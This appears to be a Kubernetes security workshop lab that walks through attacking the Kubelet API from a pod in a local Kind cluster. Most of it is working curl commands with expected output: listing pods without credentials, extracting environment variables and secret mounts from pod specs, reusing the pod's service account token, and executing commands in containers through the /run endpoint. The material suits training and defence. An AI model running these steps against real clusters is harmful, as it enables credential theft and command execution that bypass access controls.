# Accessing the Kubelet API

The Kubelet runs on every node and exposes an HTTP API on port 10255 (read-only, unauthenticated by default) and an HTTPS API on port 10250. An attacker with network access from inside a pod can query both endpoints to enumerate running pods, read container logs, and execute commands in containers — all bypassing the Kubernetes API server and its RBAC controls.

## Description

Kubelet is the Kubernetes agent installed on each node. It is responsible for the proper execution of pods assigned to the node. Kubelet exposes a read-only API service that does not require authentication (TCP port 10255). Attackers with network access to the host (for example, via running code on a compromised container) can send API requests to the Kubelet API.

Key endpoints include:

| Port | Protocol | Auth Required | Endpoint | Description |
|------|----------|---------------|----------|-------------|
| 10255 | HTTP | No | `/pods` | List all pods on the node |
| 10255 | HTTP | No | `/spec/` | Node resource info (CPU, memory) |
| 10255 | HTTP | No | `/metrics` | Prometheus metrics |
| 10250 | HTTPS | Optional | `/pods` | List all pods on the node |
| 10250 | HTTPS | Optional | `/run/<ns>/<pod>/<container>` | Execute commands in containers |
| 10250 | HTTPS | Optional | `/logs/<logfile>` | Read node system logs |
| 10250 | HTTPS | Optional | `/exec/<ns>/<pod>/<container>` | Exec via WebSocket |

Port 10250 may require a client certificate or bearer token depending on cluster configuration. In many default setups and older clusters, anonymous access to port 10250 is still permitted.

## Prerequisites

- A running Kind cluster named `workshop-cluster`.
- `kubectl` installed and configured to connect to your cluster.

## Quick Start

### Step 1 - Deploy the attacker pod

Deploy a pod that will be used to probe the Kubelet API from within the cluster network:

```bash
kubectl apply -f kubelet-explorer.yaml
```

Wait for the pod to be ready:

```bash
kubectl get pod kubelet-explorer
```

Expected output:

```
NAME               READY   STATUS    RESTARTS   AGE
kubelet-explorer   1/1     Running   0          10s
```

### Step 2 - Discover the node IP

From your workstation, find the IP address of the node where the pod is running:

```bash
# List nodes with their internal IPs
kubectl get nodes -o wide
```

Expected output (IPs and node names vary by cluster):

```
NAME                 STATUS   ROLES           AGE   VERSION   INTERNAL-IP   EXTERNAL-IP   OS-IMAGE
kind-control-plane   Ready    control-plane   1h    v1.30.2   172.23.0.4    <none>        Debian GNU/Linux 12 (bookworm)
kind-worker          Ready    <none>          1h    v1.30.2   172.23.0.3    <none>        Debian GNU/Linux 12 (bookworm)
kind-worker2         Ready    <none>          1h    v1.30.2   172.23.0.2    <none>        Debian GNU/Linux 12 (bookworm)
kind-worker3         Ready    <none>          1h    v1.30.2   172.23.0.5    <none>        Debian GNU/Linux 12 (bookworm)
```

Note the `INTERNAL-IP` — this is the address the Kubelet is listening on.

### Step 3 - Exec into the attacker pod

```bash
kubectl exec -it pod/kubelet-explorer -- /bin/sh
```

Install required tools:

```bash
apk add --no-cache curl jq
```

### Step 4 - Discover the node IP from inside the pod

The node's IP is exposed as the `status.hostIP` field and can be retrieved from the Kubernetes downward API, or directly from the node's environment:

```bash
# The node IP is often reachable via the default gateway
ip route | grep default
```

Expected output (gateway address varies by CNI and cluster setup):

```
default via 169.254.1.1 dev eth0
```

Alternatively, if the pod spec includes the node IP via the downward API (as in `kubelet-explorer.yaml`):

```bash
echo $NODE_IP
```

You can also get the node IP by reading the pod's own information from the Kubernetes API:

```bash
APISERVER=https://kubernetes.default.svc.cluster.local
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -s --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/nodes" \
  | jq '.items[].status.addresses[] | select(.type=="InternalIP") | .address'
```

### Step 5 - Query the read-only Kubelet API (port 10255)

> **Note for Kind clusters**: Port 10255 (read-only, unauthenticated) is **disabled by default** in Kind v1.26+ and most modern Kubernetes distributions. Attempting to connect will result in `Connection refused`. In older or misconfigured clusters this port is open.

Port 10255 requires no authentication when enabled. List all pods running on the node:

```bash
NODE_IP=<node-ip-from-above>

# List all pods on this node
curl -s "http://$NODE_IP:10255/pods" | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, status: .status.phase}'
```

Expected output (when port 10255 is enabled):

```json
{"name": "kubelet-explorer", "namespace": "default", "status": "Running"}
{"name": "coredns-5dd5756b68-xxxx", "namespace": "kube-system", "status": "Running"}
{"name": "etcd-kind-control-plane", "namespace": "kube-system", "status": "Running"}
{"name": "kube-apiserver-kind-control-plane", "namespace": "kube-system", "status": "Running"}
```

This reveals every workload on the node, including system components, without any Kubernetes credentials.

### Step 6 - Extract sensitive data from pod specs via port 10255

Pod specs returned by `/pods` contain environment variables, volume mounts, and image names — often including credentials:

```bash
# Extract all environment variables from all pods on this node
curl -s "http://$NODE_IP:10255/pods" \
  | jq '.items[] | {
      pod: .metadata.name,
      namespace: .metadata.namespace,
      envVars: [.spec.containers[].env // [] | .[] | {name: .name, value: .value}]
    }' \
  | jq 'select(.envVars | length > 0)'
```

```bash
# Extract volume mount paths to identify mounted secrets and configmaps
curl -s "http://$NODE_IP:10255/pods" \
  | jq '.items[] | {
      pod: .metadata.name,
      volumes: [.spec.volumes // [] | .[] | {name: .name, secret: .secret?.secretName, configmap: .configMap?.name}]
    }'
```

```bash
# Get node resource information
curl -s "http://$NODE_IP:10255/spec/" | jq '{cpuCount: .num_cores, memoryCapacity: .memory_capacity}'
```

### Step 7 - Query the authenticated Kubelet API (port 10250)

Port 10250 serves the full Kubelet API over HTTPS. On misconfigured clusters that allow anonymous access, no credentials are needed:

```bash
# List pods — skip TLS verification since we don't have the Kubelet's CA
curl -sk "https://$NODE_IP:10250/pods" \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'
```

In Kind clusters, anonymous access returns `Unauthorized`. Use the service account token from the pod. Note that the service account must have the `nodes/proxy` subresource permission (granted in `kubelet-explorer.yaml`):

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  "https://$NODE_IP:10250/pods" \
  | jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace}'
```

### Step 8 - Execute commands in containers via the Kubelet API (port 10250)

The `/run` endpoint allows executing arbitrary commands in any container on the node. This bypasses `kubectl exec` and its RBAC controls entirely:

```bash
# Execute a command in a target container
# Format: /run/<namespace>/<pod-name>/<container-name>?cmd=<full-path-to-binary>
# Replace with an actual pod/container running on the node

TARGET_NS="default"
TARGET_POD="kubelet-explorer"
TARGET_CONTAINER="attacker"

curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -X POST \
  "https://$NODE_IP:10250/run/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?cmd=/usr/bin/id"
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys)
```

> **Note**: The `cmd` parameter must be a URL query parameter (not a POST body), and must be the **full path** to the binary. Using just `id` instead of `/usr/bin/id` will result in "executable file not found" errors.

```bash
# Read /etc/passwd from a target container
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -X POST \
  "https://$NODE_IP:10250/run/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?cmd=/bin/cat%20/etc/passwd"
```

```bash
# Read environment variables from a target container
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  -X POST \
  "https://$NODE_IP:10250/run/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?cmd=/usr/bin/env"
```

This is effectively remote code execution in any container on the node without going through the Kubernetes API server RBAC.

### Step 9 - Read container logs via the Kubelet API

```bash
# Format: /containerLogs/<namespace>/<pod-name>/<container-name>
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  "https://$NODE_IP:10250/containerLogs/$TARGET_NS/$TARGET_POD/$TARGET_CONTAINER?tailLines=50"
```

### Step 10 - Query Kubelet metrics for reconnaissance

Prometheus metrics expose internal Kubelet state and can reveal running containers, resource usage, and node configuration:

```bash
# Read Kubelet metrics via port 10250 (requires nodes/proxy or nodes/metrics permission)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  "https://$NODE_IP:10250/metrics" | grep -E '^kubelet_running_(pods|containers)'
```

> **Note**: Port 10255 (unauthenticated metrics) is disabled in Kind and most modern clusters. Use port 10250 with the service account token instead.

Expected output:

```
kubelet_running_containers{container_state="running"} 8
kubelet_running_pods 5
```

## Cleanup

```bash
kubectl delete -f kubelet-explorer.yaml
```

## Resources

- [Kubelet API Reference](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)
- [Kubelet Authentication and Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [Securing Kubelet](https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#controlling-what-privileges-containers-run-with)
- [MITRE ATT&CK - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/)
- [Kubernetes Kubelet Security Configuration](https://www.cncf.io/blog/2021/04/26/securek8s-securing-the-kubelet/)
